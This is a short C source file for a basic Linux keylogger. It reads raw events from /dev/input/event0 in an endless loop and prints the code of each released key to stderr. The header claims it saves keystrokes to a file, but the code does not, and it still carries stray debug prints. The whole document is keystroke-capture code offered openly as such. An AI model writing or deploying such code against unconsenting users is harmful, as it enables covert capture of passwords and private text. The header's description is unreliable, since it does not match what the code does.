/* 
 *Simple C program/kernel module to save keystrokes to a file
 *Author: Meghraj Bendre <bendremeghraj@gmail.com>
 *
 * Implemented using the Linux Input Event Interface 
 * */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <error.h>

//#include "keylogger.h"
int main(int argc, char *argv[]) {
    struct input_event input_ev;
    int fd = open("/dev/input/event0", O_RDONLY); //open the input driver 
    if (fd < 0){
        perror("Failed to open the device...");
        exit(1);
    }    
    while(1) {
       printf("\nHello1\n");
        read(fd, &input_ev, sizeof(struct input_event));
        /*input_event.type specifies the input type/method which is key in our case
         * input_event.value == 0 specifies key_release
        */
       printf("\nHello1\n");
        if((input_ev.type == EV_KEY) && (input_ev.value == 0)) {
            fprintf(stderr, "%d\n", input_ev.code);//key_map[input_ev.code][0]);
        }
    
    }

    close(fd);
    return 0;
}
